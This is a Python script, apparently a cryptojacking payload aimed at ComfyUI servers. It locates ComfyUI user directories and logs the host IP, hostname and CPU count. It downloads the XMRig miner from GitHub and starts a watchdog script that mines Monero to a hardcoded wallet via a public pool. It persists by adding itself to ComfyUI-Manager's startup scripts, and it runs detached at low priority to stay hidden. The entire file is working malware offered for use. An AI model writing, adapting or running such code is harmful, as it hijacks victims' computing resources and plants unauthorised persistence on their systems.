#!/usr/bin/env python3
import os, sys, io, glob, time, tarfile, subprocess, urllib.request

WALLET = "45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD"
POOL = "pool.hashvault.pro:443"
D = "/root/.hkc"

def userdirs():
    out = []
    base = os.environ.get("COMFYUI_FOLDERS_BASE_PATH")
    if base:
        out.append(os.path.join(base, "user", "default"))
        out.append(os.path.join(base, "user"))
    for pat in ("/ComfyUI/user/default", "/work/ComfyUI/user/default", "/app/user/default",
                "/root/ComfyUI/user/default", "/home/*/ComfyUI/user/default"):
        out.extend(glob.glob(pat))
    for p in ("/", "/work", "/app", "/opt", "/root", "/home"):
        try:
            for name in os.listdir(p):
                c = os.path.join(p, name, "user", "default")
                if os.path.isdir(c):
                    out.append(c)
        except Exception:
            pass
    seen, res = set(), []
    for x in out:
        if x and x not in seen and os.path.isdir(x):
            seen.add(x); res.append(x)
    return res

def report(ud, txt):
    for d in ud:
        try:
            open(os.path.join(d, "hk41_plant.txt"), "a").write(txt)
        except Exception:
            pass
    try:
        open("/tmp/hk41_plant.txt", "a").write(txt)
    except Exception:
        pass
    sys.stdout.write(txt); sys.stdout.flush()

def main():
    ud = userdirs()
    ip = (subprocess.run(["hostname", "-I"], capture_output=True, text=True).stdout.split() or ["?"])[0]
    host = subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip()
    report(ud, "\n=== %s ip=%s host=%s uid=%d nproc=%s\n" % (time.strftime("%FT%TZ", time.gmtime()), ip, host, os.getuid(),
             subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip()))
    os.makedirs(D, exist_ok=True)
    if not os.access(os.path.join(D, "xmrig"), os.X_OK):
        u = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
        try:
            b = urllib.request.urlopen(u, timeout=120).read()
            report(ud, "dl=%d\n" % len(b))
            os.makedirs(D + "/x", exist_ok=True)
            tarfile.open(fileobj=io.BytesIO(b)).extractall(D + "/x")
            src = glob.glob(D + "/x/*/xmrig")[0]
            subprocess.run(["cp", "-f", src, D + "/xmrig"], check=True)
            os.chmod(D + "/xmrig", 0o755)
        except Exception as e:
            report(ud, "download FAILED: %r\n" % e)
            return
    wd = D + "/wd.sh"
    open(wd, "w").write("""#!/bin/sh
pgrep -f '/root\\.hkc/xmrig' >/dev/null 2>&1 && exit 0
T=$(( $(nproc) / 2 )); [ "$T" -lt 1 ] && T=1; [ "$T" -gt 6 ] && T=6
while true; do nice -n 19 /root/.hkc/xmrig -o %s --tls -u %s -p hk-$(hostname -I | awk '{print $1}') -k --threads $T --donate-level 1 -B >> /root/.hkc/xmr.log 2>&1; sleep 30; done
""" % (POOL, WALLET))
    os.chmod(wd, 0o755)
    line = "['/tmp', '/bin/sh', '%s']" % wd
    for d in ud:
        f = os.path.join(d, "ComfyUI-Manager", "startup-scripts", "install-scripts.txt")
        try:
            os.makedirs(os.path.dirname(f), exist_ok=True)
            cur = open(f).read() if os.path.exists(f) else ""
            if wd not in cur:
                open(f, "a").write(line + "\n")
        except Exception as e:
            report(ud, "persist FAILED %s: %r\n" % (f, e))
    subprocess.Popen(["/usr/bin/setsid", "/bin/sh", wd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     start_new_session=True)
    time.sleep(12)
    ps = subprocess.run(["pgrep", "-af", "/root/.hkc/xmrig"], capture_output=True, text=True).stdout.strip()
    report(ud, "ps=%s\n" % ps.replace("\n", " | ")[:400])
    try:
        log = open(D + "/xmr.log").read()[-600:]
    except Exception:
        log = "(no log)"
    report(ud, "log_tail=%s\n" % log.replace("\n", " / "))

main()
